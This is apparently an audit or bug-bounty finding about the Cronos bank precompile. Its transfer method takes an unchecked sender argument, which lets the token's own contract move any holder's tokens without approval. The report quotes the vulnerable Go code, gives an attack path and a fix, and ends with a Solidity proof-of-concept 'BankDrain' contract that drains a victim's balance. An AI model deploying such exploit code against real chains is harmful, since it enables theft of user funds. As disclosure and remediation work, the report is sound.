### Title
Unauthorized Token Transfer via Unchecked `sender` Argument in Bank Precompile `transfer` Method - (File: x/cronos/keeper/precompiles/bank.go)

### Summary
The bank precompile's `transfer` method accepts an arbitrary `sender` address from ABI-encoded call arguments and uses it as the debit source for a native bank `SendCoins` call, without verifying that the calling contract is authorized to spend from that address. Any EVM contract can invoke `bank.transfer(victimAddress, attackerAddress, amount)` to drain any account holding tokens of the calling contract's denom (`evm/<callerAddress>`), with no approval or allowance check.

### Finding Description
In `x/cronos/keeper/precompiles/bank.go`, the `Run` function handles the `transfer` method as follows:

```go
sender := args[0].(common.Address)   // attacker-controlled
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
from := sdk.AccAddress(sender.Bytes())
to := sdk.AccAddress(recipient.Bytes())
denom := EVMDenom(contract.Caller())  // "evm/<callerAddress>"
amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
// ...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

`from` is derived entirely from the first ABI argument (`sender`), not from `contract.Caller()`. There is no check that `contract.Caller() == sender`, no allowance/approval mechanism, and no other authorization guard. The only restriction is that the denom is scoped to `"evm/" + contract.Caller().Hex()`, meaning the tokens being moved must be of the calling contract's own denom.

**Attack path:**
1. Attacker deploys a contract `C` at address `0xC`.
2. Contract `C` calls `bank.mint(victimAddress, amount)` — legitimately or as part of a yield-farming/airdrop scheme — crediting `victim` with `amount` of denom `evm/0xC`.
3. Victim holds these tokens (possibly used as collateral or liquidity in a DeFi protocol built on top of this primitive).
4. Attacker calls `C.transfer(victimAddress, attackerAddress, amount)` via any EVM transaction.
5. The bank precompile executes `SendCoins(victim, attacker, amount)` with no authorization check.
6. Victim's entire balance of `evm/0xC` is transferred to the attacker.

The `burn` method has the same structural issue (burns from an arbitrary `recipient` address), but `transfer` is the critical path because it enables direct asset theft rather than destruction.

### Impact Explanation
**Critical — Unauthorized transfer of precompile-controlled assets.**

Any unprivileged EVM contract deployer can drain the full balance of any account holding tokens of that contract's denom. In protocols that use the bank precompile to issue native tokens to users (e.g., wrapped assets, receipt tokens, LP shares backed by `evm/<addr>` denom), the deployer retains a permanent, hidden backdoor to confiscate all user balances at will. This satisfies the "Critical: Unauthorized transfer of precompile-controlled assets" impact category.

### Likelihood Explanation
The attack requires only:
- Deploying an EVM contract (unprivileged, costs only gas).
- Having users hold tokens of that contract's denom (achievable by minting tokens to users as part of any DeFi protocol).

No admin keys, governance access, or cryptographic breaks are needed. The entry path is a standard EVM transaction calling the bank precompile at address `0x0000...0064`.

### Recommendation
In the `transfer` case, enforce that the debit source is the calling contract itself, not an arbitrary argument:

```go
// Replace:
sender := args[0].(common.Address)
from := sdk.AccAddress(sender.Bytes())

// With:
from := sdk.AccAddress(contract.Caller().Bytes())
// recipient remains args[0], amount args[1]
```

If the intended design is to allow contracts to move tokens on behalf of users, an explicit on-chain allowance/approval mapping (analogous to ERC-20 `approve`/`transferFrom`) must be implemented and checked before executing `SendCoins`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBank {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract BankDrain {
    IBank constant bank = IBank(address(0x0000000000000000000000000000000000000064));

    // Step 1: Mint tokens to victim (e.g., as part of a yield scheme)
    function seedVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: Drain victim's balance — no approval needed
    function drain(address victim, address attacker, uint256 amount) external {
        bank.transfer(victim, attacker, amount);
    }
}
```

**Expected outcome:** After `seedVictim(victim, 1000)`, calling `drain(victim, attacker, 1000)` transfers 1000 tokens of denom `evm/<BankDrain address>` from `victim` to `attacker` with no authorization from `victim`. The `SendCoins` call in the bank precompile succeeds because `from` is set to `victim` directly from the ABI argument, bypassing any caller-identity check. [1](#0-0) [2](#0-1)
